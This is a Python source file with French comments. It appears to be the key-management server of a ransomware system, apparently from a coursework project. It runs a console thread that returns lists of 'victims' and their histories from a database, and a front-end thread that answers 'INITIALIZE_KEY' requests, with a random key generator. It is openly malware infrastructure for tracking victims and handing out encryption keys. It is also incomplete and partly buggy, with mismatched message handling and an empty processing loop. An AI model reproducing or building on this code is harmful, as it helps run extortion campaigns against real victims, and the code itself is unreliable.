import socket
import string
import secrets

import utile.message
import utile.network as network
import utile.message as message
import utile.data as data
import threading
import queue

LOCAL_IP = socket.gethostname()
PORT_SERV_CLES_0 = 8380
PORT_SERV_CLES_1 = 8381


def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    cle = ''
    for i in range(longueur):
        cara = ''.join(secrets.choice(caracteres))
        cle += cara
    return cle


def main():
    # Crée une file d'attente pour la communication entre threads
    fifo = queue.Queue()

    # Lance un thread pour la gestion de la console
    thread_console = threading.Thread(target=console_thread, args=(fifo,))
    thread_console.start()

    # Lance un thread pour la gestion du frontal
    thread_frontal = threading.Thread(target=frontal_thread, args=(fifo,))
    thread_frontal.start()

    while True:
        # Attend et récupère les éléments de la file d'attente
        resultat = fifo.get()

        # Résolution ou traitement ultérieur


def console_thread(fifo):
    connexion_db = data.connect_db()
    server_socket = network.start_net_serv(port=PORT_SERV_CLES_0)

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        # Accepter une nouvelle connexion
        client_socket, client_address = server_socket.accept()
        print(f"Nouvelle connexion entrante de {client_address}")

        # Insérer le traitement des données ici
        while True:
            # Recevoir le message du client
            message = network.receive_message(client_socket)
            msg_type = utile.message.set_message(message)
            if not message:
                break

            # Afficher le message reçu
            print(f"Message du client : {message}")

            if message == 'LIST_VICTIM_REQ':
                print('Message reçu : LIST_VICTIM_REQ')
                victims = data.get_list_victims(connexion_db)
                print(victims)

                for victim in victims:
                    # Envoi des messages list_victime_resp
                    msg = utile.message.set_message('list_victim_resp', victim)
                    network.send_message(client_socket, msg)

                # Envoi du message list_victime_end
                msg = utile.message.set_message('list_victim_end')
                network.send_message(client_socket, msg)

            elif message == 'HISTORY_REQ':
                id_victim = msg_type['HIST_REQ']
                histories = data.get_list_history(connexion_db, id_victim)
                for history in histories:
                    # Envoi des messages history_resp
                    msg = utile.message.set_message('history_resp', history)
                    network.send_message(client_socket, msg)

                # Envoi du message history_end
                msg = utile.message.set_message('history_end', [id_victim])
                network.send_message(client_socket, msg)
            else:
                print('Failed ! ')

            # Après avoir traité le message du client, envoyer un message de confirmation à la console de contrôle
            confirmation_message = "Message reçu par le serveur."
            network.send_message(client_socket, confirmation_message.encode('utf-8'))

        # Fermer la connexion avec le client
        client_socket.close()


def frontal_thread(fifo):
    """
    Fonction exécutée par le thread frontal.
    Écoute les connexions entrantes et envoie les messages à la file d'attente.
    """
    # Démarrage du serveur sur le port PORT_SERV_CLES_1
    frontal_conn = network.start_net_serv(LOCAL_IP, PORT_SERV_CLES_1)

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        print(f"Écoute {network.LOCAL_IP}:{PORT_SERV_CLES_1}")
        s_frontal, address_console = frontal_conn.accept()
        msg = network.receive_message(s_frontal)
        print('2. Bien reçu du serveur frontal:')
        print(f'{msg}\n')
        fifo.put(msg)
        if msg:
            network.send_message(s_frontal, message.set_message("INITIALIZE_KEY", ))
            print('3. Bien envoyé au serveur frontal')


if __name__ == '__main__':
    main()